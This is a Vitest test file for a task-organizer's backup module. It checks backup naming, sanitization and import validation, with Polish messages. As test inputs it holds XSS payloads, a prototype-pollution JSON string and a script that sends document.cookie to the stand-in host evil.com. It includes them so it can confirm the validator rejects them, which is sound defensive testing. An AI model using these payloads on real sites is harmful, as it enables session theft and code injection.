import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  generateBackupFileName,
  containsMaliciousPayload,
  sanitizeString,
  validateAndSanitizeImport,
  exportTasksToJson,
  BackupValidationError,
} from './backup';
import type { Task } from '../types';

describe('backup utility module', () => {
  describe('generateBackupFileName', () => {
    it('generates backup file name with current date by default in format organizer-backup-YYYY-MM-DD.json', () => {
      const fileName = generateBackupFileName();
      expect(fileName).toMatch(/^organizer-backup-\d{4}-\d{2}-\d{2}\.json$/);
    });

    it('formats given custom date correctly with zero-padded month and day', () => {
      const date = new Date(2026, 4, 3); // May 3, 2026
      const fileName = generateBackupFileName(date);
      expect(fileName).toBe('organizer-backup-2026-05-03.json');
    });

    it('formats date at the end of year correctly', () => {
      const date = new Date(2026, 11, 31); // December 31, 2026
      const fileName = generateBackupFileName(date);
      expect(fileName).toBe('organizer-backup-2026-12-31.json');
    });
  });

  describe('containsMaliciousPayload', () => {
    it('detects <script> tags', () => {
      expect(containsMaliciousPayload('<script>alert("XSS")</script>')).toBe(true);
      expect(containsMaliciousPayload('<SCRIPT src="evil.js"></SCRIPT>')).toBe(true);
      expect(containsMaliciousPayload('<script >')).toBe(true);
    });

    it('detects <iframe>, <object>, and other dangerous HTML tags', () => {
      expect(containsMaliciousPayload('<iframe src="evil.com"></iframe>')).toBe(true);
      expect(containsMaliciousPayload('<object data="exploit.swf"></object>')).toBe(true);
      expect(containsMaliciousPayload('<embed src="evil.swf">')).toBe(true);
      expect(containsMaliciousPayload('<meta http-equiv="refresh" content="0">')).toBe(true);
      expect(containsMaliciousPayload('<base href="http://evil.com/">')).toBe(true);
    });

    it('detects dangerous pseudoprotocols (javascript:, vbscript:, data:text/html)', () => {
      expect(containsMaliciousPayload('javascript:alert(1)')).toBe(true);
      expect(containsMaliciousPayload('JAVASCRIPT:void(0)')).toBe(true);
      expect(containsMaliciousPayload('vbscript:msgbox("x")')).toBe(true);
      expect(containsMaliciousPayload('data:text/html,<script>alert(1)</script>')).toBe(true);
    });

    it('detects inline HTML event handlers', () => {
      expect(containsMaliciousPayload('<img src="x" onerror=alert(1)>')).toBe(true);
      expect(containsMaliciousPayload('<svg onload=alert(1)>')).toBe(true);
      expect(containsMaliciousPayload('text with onclick = "doEvil()"')).toBe(true);
    });

    it('returns false for safe typical task titles', () => {
      expect(containsMaliciousPayload('Zaimplementować eksport i import bazy')).toBe(false);
      expect(containsMaliciousPayload('Zadanie 1: Fix bug w komponencie <Header />')).toBe(false);
      expect(containsMaliciousPayload('Porównanie A < B oraz B > C')).toBe(false);
      expect(containsMaliciousPayload('Kupić 2 x chleb & mleko')).toBe(false);
    });
  });

  describe('sanitizeString', () => {
    it('trims leading and trailing whitespace', () => {
      expect(sanitizeString('   zadanie z odstępami   ')).toBe('zadanie z odstępami');
    });

    it('removes null bytes and non-printable control characters', () => {
      const maliciousWithNull = 'Tytuł zadania\u0000 z bajtem null\u0007\u001F';
      expect(sanitizeString(maliciousWithNull)).toBe('Tytuł zadania z bajtem null');
    });

    it('preserves valid unicode characters (polish diacritics, emojis)', () => {
      expect(sanitizeString('Zażółć gęślą jaźń 🚀')).toBe('Zażółć gęślą jaźń 🚀');
    });
  });

  describe('validateAndSanitizeImport', () => {
    const validSampleTask: Task = {
      id: 'task-1',
      title: 'Zadanie testowe',
      status: 'todo',
      priority: 'medium',
      day: 'mon',
      order: 0,
      createdAt: '2026-10-19T10:00:00.000Z',
    };

    it('successfully validates and returns tasks from an array of valid tasks', () => {
      const input: Task[] = [
        validSampleTask,
        {
          id: 'task-2',
          title: 'Drugie zadanie w backlogu',
          status: 'done',
          priority: 'high',
          day: null,
          order: 1,
          createdAt: '2026-10-19T11:00:00.000Z',
        },
      ];

      const result = validateAndSanitizeImport(input);
      expect(result).toHaveLength(2);
      expect(result[0]).toEqual(validSampleTask);
      expect(result[1].day).toBeNull();
      expect(result[1].status).toBe('done');
      expect(result[1].priority).toBe('high');
    });

    it('successfully parses and validates raw JSON string input', () => {
      const jsonString = JSON.stringify([validSampleTask]);
      const result = validateAndSanitizeImport(jsonString);

      expect(result).toHaveLength(1);
      expect(result[0].id).toBe('task-1');
      expect(result[0].title).toBe('Zadanie testowe');
    });

    it('returns an empty array when given an empty array []', () => {
      expect(validateAndSanitizeImport([])).toEqual([]);
      expect(validateAndSanitizeImport('[]')).toEqual([]);
    });

    it('discards unknown and extraneous properties from task objects', () => {
      const taskWithUnknownFields = {
        ...validSampleTask,
        extraProperty: 'should be stripped',
        maliciousAdminFlag: true,
        tags: ['unexpected', 'array'],
      };

      const result = validateAndSanitizeImport([taskWithUnknownFields]);
      expect(result).toHaveLength(1);

      const sanitized = result[0];
      expect(sanitized).toEqual(validSampleTask);
      expect((sanitized as unknown as Record<string, unknown>).extraProperty).toBeUndefined();
      expect((sanitized as unknown as Record<string, unknown>).maliciousAdminFlag).toBeUndefined();
      expect((sanitized as unknown as Record<string, unknown>).tags).toBeUndefined();
    });

    it('trims whitespace and sanitizes control characters in title and id', () => {
      const taskWithDirtyStrings = {
        ...validSampleTask,
        id: '  task-1\u0000  ',
        title: '  Zadanie ze spacjami i bajtem null\u0007  ',
      };

      const result = validateAndSanitizeImport([taskWithDirtyStrings]);
      expect(result[0].id).toBe('task-1');
      expect(result[0].title).toBe('Zadanie ze spacjami i bajtem null');
    });

    it('normalizes valid date string into canonical ISO string', () => {
      const taskWithNonIsoDate = {
        ...validSampleTask,
        createdAt: '2026-10-19 12:00:00 UTC',
      };

      const result = validateAndSanitizeImport([taskWithNonIsoDate]);
      expect(result[0].createdAt).toBe(new Date('2026-10-19 12:00:00 UTC').toISOString());
    });

    it('supports all valid weekdays and null for day', () => {
      const weekdays = ['mon', 'tue', 'wed', 'thu', 'fri', 'sat', 'sun'] as const;
      const tasks: Task[] = weekdays.map((day, idx) => ({
        id: `task-${day}`,
        title: `Zadanie na ${day}`,
        status: 'todo',
        priority: 'low',
        day,
        order: idx,
        createdAt: '2026-10-19T10:00:00.000Z',
      }));

      const result = validateAndSanitizeImport(tasks);
      expect(result).toHaveLength(7);
      result.forEach((t, i) => {
        expect(t.day).toBe(weekdays[i]);
      });
    });

    // Error Cases / DoD
    it('throws BackupValidationError for malformed JSON string', () => {
      expect(() => validateAndSanitizeImport('{ invalid json')).toThrowError(BackupValidationError);
      expect(() => validateAndSanitizeImport('{ invalid json')).toThrowError(/Nieprawidłowy format JSON/);
    });

    it('throws BackupValidationError when data is null or undefined', () => {
      expect(() => validateAndSanitizeImport(null)).toThrowError(BackupValidationError);
      expect(() => validateAndSanitizeImport(undefined)).toThrowError(BackupValidationError);
    });

    it('throws BackupValidationError when data is not an array (e.g. object, number, boolean)', () => {
      expect(() => validateAndSanitizeImport({})).toThrowError(BackupValidationError);
      expect(() => validateAndSanitizeImport(123)).toThrowError(BackupValidationError);
      expect(() => validateAndSanitizeImport(true)).toThrowError(BackupValidationError);
      expect(() => validateAndSanitizeImport('{"tasks": []}')).toThrowError(BackupValidationError);
    });

    it('throws BackupValidationError when item is not a plain object', () => {
      expect(() => validateAndSanitizeImport(['not an object'])).toThrowError(BackupValidationError);
      expect(() => validateAndSanitizeImport([null])).toThrowError(BackupValidationError);
      expect(() => validateAndSanitizeImport([[1, 2, 3]])).toThrowError(BackupValidationError);
    });

    it('throws BackupValidationError on prototype pollution attempt', () => {
      const maliciousJson = '[{"__proto__": {"polluted": true}, "id": "1", "title": "test", "status": "todo", "priority": "low", "day": null, "order": 0, "createdAt": "2026-10-19T10:00:00.000Z"}]';
      expect(() => validateAndSanitizeImport(maliciousJson)).toThrowError(BackupValidationError);
    });

    it('throws BackupValidationError when id is missing, not a string, or empty', () => {
      const invalidNoId = { ...validSampleTask, id: undefined };
      const invalidEmptyId = { ...validSampleTask, id: '   ' };
      const invalidNumericId = { ...validSampleTask, id: 12345 };

      expect(() => validateAndSanitizeImport([invalidNoId])).toThrowError(/identyfikator/);
      expect(() => validateAndSanitizeImport([invalidEmptyId])).toThrowError(/pusty identyfikator/);
      expect(() => validateAndSanitizeImport([invalidNumericId])).toThrowError(/identyfikator/);
    });

    it('throws BackupValidationError when duplicate ids exist in the dataset', () => {
      const task1 = { ...validSampleTask, id: 'duplicate-id' };
      const task2 = { ...validSampleTask, id: 'duplicate-id', title: 'Inny tytuł' };

      expect(() => validateAndSanitizeImport([task1, task2])).toThrowError(/zduplikowany identyfikator/);
    });

    it('throws BackupValidationError when id contains malicious script payload', () => {
      const taskWithEvilId = {
        ...validSampleTask,
        id: '<script>alert("pwn")</script>',
      };

      expect(() => validateAndSanitizeImport([taskWithEvilId])).toThrowError(/złośliwy ładunek/);
    });

    it('throws BackupValidationError when title is missing, not a string, or empty', () => {
      const noTitle = { ...validSampleTask, title: undefined };
      const emptyTitle = { ...validSampleTask, title: '   ' };
      const nonStringTitle = { ...validSampleTask, title: 999 };

      expect(() => validateAndSanitizeImport([noTitle])).toThrowError(/tytuł/);
      expect(() => validateAndSanitizeImport([emptyTitle])).toThrowError(/pusty tytuł/);
      expect(() => validateAndSanitizeImport([nonStringTitle])).toThrowError(/tytuł/);
    });

    it('throws BackupValidationError when title exceeds 500 characters', () => {
      const longTitle = 'a'.repeat(501);
      const taskWithLongTitle = { ...validSampleTask, title: longTitle };

      expect(() => validateAndSanitizeImport([taskWithLongTitle])).toThrowError(/500 znaków/);
    });

    it('throws BackupValidationError when title contains malicious XSS payload', () => {
      const scriptPayload = {
        ...validSampleTask,
        title: 'Kupić mleko <script>fetch("http://evil.com?c=" + document.cookie)</script>',
      };
      const imgOnErrorPayload = {
        ...validSampleTask,
        title: '<img src=x onerror=alert(1)>',
      };
      const javascriptProtocolPayload = {
        ...validSampleTask,
        title: 'Kliknij tutaj javascript:alert("XSS")',
      };

      expect(() => validateAndSanitizeImport([scriptPayload])).toThrowError(/złośliwy ładunek/);
      expect(() => validateAndSanitizeImport([imgOnErrorPayload])).toThrowError(/złośliwy ładunek/);
      expect(() => validateAndSanitizeImport([javascriptProtocolPayload])).toThrowError(/złośliwy ładunek/);
    });

    it('does not reject legitimate user titles containing words starting with on (e.g. online, onboarding)', () => {
      const legitimateTasks: Task[] = [
        {
          ...validSampleTask,
          id: 'task-online',
          title: 'Spotkanie online = omówienie projektu',
        },
        {
          ...validSampleTask,
          id: 'task-onboarding',
          title: 'Etap 1: onboarding = ukończony',
        },
        {
          ...validSampleTask,
          id: 'task-symbols',
          title: 'Cena < 100 zł; stan online = aktywny',
        },
      ];

      const result = validateAndSanitizeImport(legitimateTasks);
      expect(result).toHaveLength(3);
      expect(result[0].title).toBe('Spotkanie online = omówienie projektu');
      expect(result[1].title).toBe('Etap 1: onboarding = ukończony');
    });

    it('throws BackupValidationError when title after sanitization becomes empty', () => {
      const taskWithOnlyNullBytes = {
        ...validSampleTask,
        title: '\u0000\u0001\u0007',
      };

      expect(() => validateAndSanitizeImport([taskWithOnlyNullBytes])).toThrowError(/pusty/);
    });

    it('throws BackupValidationError when status is invalid', () => {
      const invalidStatus = { ...validSampleTask, status: 'in_progress' };
      expect(() => validateAndSanitizeImport([invalidStatus])).toThrowError(/nieprawidłowy status/);
    });

    it('throws BackupValidationError when priority is invalid', () => {
      const invalidPriority = { ...validSampleTask, priority: 'critical' };
      expect(() => validateAndSanitizeImport([invalidPriority])).toThrowError(/nieprawidłowy priorytet/);
    });

    it('throws BackupValidationError when day is invalid', () => {
      const invalidDay = { ...validSampleTask, day: 'monday' };
      const invalidDayNumber = { ...validSampleTask, day: 1 };

      expect(() => validateAndSanitizeImport([invalidDay])).toThrowError(/nieprawidłowy dzień/);
      expect(() => validateAndSanitizeImport([invalidDayNumber])).toThrowError(/nieprawidłowy dzień/);
    });

    it('throws BackupValidationError when order is negative, not an integer, or not a number', () => {
      const negativeOrder = { ...validSampleTask, order: -1 };
      const floatOrder = { ...validSampleTask, order: 2.5 };
      const stringOrder = { ...validSampleTask, order: '0' };

      expect(() => validateAndSanitizeImport([negativeOrder])).toThrowError(/kolejność/);
      expect(() => validateAndSanitizeImport([floatOrder])).toThrowError(/kolejność/);
      expect(() => validateAndSanitizeImport([stringOrder])).toThrowError(/kolejność/);
    });

    it('throws BackupValidationError when createdAt is invalid or not an ISO date', () => {
      const invalidDateString = { ...validSampleTask, createdAt: 'nie-data' };
      const emptyDate = { ...validSampleTask, createdAt: '' };
      const nonStringDate = { ...validSampleTask, createdAt: 123456789 };

      expect(() => validateAndSanitizeImport([invalidDateString])).toThrowError(/createdAt/);
      expect(() => validateAndSanitizeImport([emptyDate])).toThrowError(/createdAt/);
      expect(() => validateAndSanitizeImport([nonStringDate])).toThrowError(/createdAt/);
    });
  });

  describe('exportTasksToJson', () => {
    let mockCreateObjectURL: ReturnType<typeof vi.fn>;
    let mockRevokeObjectURL: ReturnType<typeof vi.fn>;
    let clickSpy: ReturnType<typeof vi.spyOn>;

    beforeEach(() => {
      mockCreateObjectURL = vi.fn().mockReturnValue('blob:http://localhost:3000/mock-uuid');
      mockRevokeObjectURL = vi.fn();

      Object.defineProperty(window.URL, 'createObjectURL', {
        writable: true,
        configurable: true,
        value: mockCreateObjectURL,
      });

      Object.defineProperty(window.URL, 'revokeObjectURL', {
        writable: true,
        configurable: true,
        value: mockRevokeObjectURL,
      });

      clickSpy = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    });

    afterEach(() => {
      vi.restoreAllMocks();
    });

    it('generates filename and triggers browser download via link click', () => {
      const sampleTasks: Task[] = [
        {
          id: 'task-1',
          title: 'Zadanie do eksportu',
          status: 'todo',
          priority: 'medium',
          day: 'mon',
          order: 0,
          createdAt: '2026-10-19T10:00:00.000Z',
        },
      ];

      const customDate = new Date(2026, 9, 19); // 2026-10-19
      const fileName = exportTasksToJson(sampleTasks, customDate);

      expect(fileName).toBe('organizer-backup-2026-10-19.json');
      expect(mockCreateObjectURL).toHaveBeenCalledTimes(1);

      // Sprawdzenie utworzonego Bloba
      const createdBlob = mockCreateObjectURL.mock.calls[0][0] as Blob;
      expect(createdBlob).toBeInstanceOf(Blob);
      expect(createdBlob.type).toBe('application/json;charset=utf-8');

      // Sprawdzenie wywołania kliknięcia w link pobierania
      expect(clickSpy).toHaveBeenCalledTimes(1);

      // Sprawdzenie zwolnienia URL
      expect(mockRevokeObjectURL).toHaveBeenCalledWith('blob:http://localhost:3000/mock-uuid');
    });

    it('handles export of empty tasks array gracefully', () => {
      const fileName = exportTasksToJson([]);
      expect(fileName).toMatch(/^organizer-backup-\d{4}-\d{2}-\d{2}\.json$/);
      expect(clickSpy).toHaveBeenCalledTimes(1);
    });
  });
});
